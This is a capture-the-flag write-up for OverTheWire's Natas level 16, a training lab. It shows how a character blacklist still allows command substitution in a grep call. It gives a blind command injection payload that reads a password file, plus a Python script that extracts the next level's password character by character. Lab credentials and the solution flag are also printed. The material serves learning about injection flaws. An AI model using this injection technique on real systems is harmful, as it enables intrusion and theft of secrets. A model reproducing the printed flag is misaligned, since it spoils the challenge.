# Natas Level 16

Access data:

    username: natas16
    password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

Connect to the service using basic HTTP auth by replacing the credentials in the link:
    
    http://*USERNAME*:*FLAG*@*USERNAME*.natas.labs.overthewire.org/

We had similar challenges earlier, but now there is filtering for special characters that make it harder to execute arbitrary commands. However, they are using a blacklist, which is rarely a good idea. For example, _$_ and _()_ are still allowed which makes [command substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html) possible.

    grep -i \"$key\" dictionary.txt

We control the unfiltered $key input.

It can be exploited performing another blind injection attack. We can use another (inner) grep command with a regular expression to query for the password within _/etc/natas_webpass/natas17_ char by char if we combine it with command substitution.

Example:

    grep -i $(grep ^a /etc/natas_webpass/natas17) dictionary.txt


 We can differentiate two cases:

1. If our guess for the current char was correct (pw begins with _a_), the password is returned. The outer grep becomes this:

        grep -i "*PASSWORD*" dictionary.txt

So it will search for the password within dictionary.txt (which will return nothing)

2. Our guess was incorrect. Outer grep becomes this:

        grep -i "" dictionary.txt

This will dump out the whole dictionary.

A script like the following can exploit this leakage of sensitive information and disclose the flag.

```python
    import requests, string
    username = "natas16"
    password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
    
    possibleCharacters = list(string.ascii_letters + string.digits) #possible flag characters are letters and digits.
    resultFlag = "" 
    characterCounter = 0
    while(len(resultFlag) < 32):

        
        current_challenge = resultFlag + possibleCharacters[characterCounter]

        #Idea for needle: If we are right with our current guess (pw begins with ^current_challenge), pw is returned. This means the outer grep will search for the pw in the dictionary and find nothing (empty response). If we are wrong, outer grep will search for "" in dictionary, dumping it out completely.
        needle = f"$(grep ^{current_challenge} /etc/natas_webpass/natas17)" 
        
        print("Testing: " + current_challenge)
        url = f"http://{username}:{password}@{username}.natas.labs.overthewire.org/?needle={needle}&submit=Search"
        resp = requests.get(url)
        #print(resp.text)
        if("Input contains an illegal character!" in resp.text):
            print("Illegal character: " + current_challenge)
            break
        if("<pre>" in resp.text):
            matches = resp.text.split("<pre>")[1]
            matches = matches.split("</pre>")[0].strip()
            
            if(not matches): #If there was NO output, this means our guess was correct because the outer grep searches for the pw in dictionary.txt and finds nothing
                print("match!")
                resultFlag = current_challenge
                characterCounter = 0
            else: #If there was output, our guess was wrong, the outer grep just dumps out the dictionary.txt
                characterCounter +=1 
                

    print("Flag: " + resultFlag)
```

<details>
  <summary>Solution</summary>
  Flag: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
</details>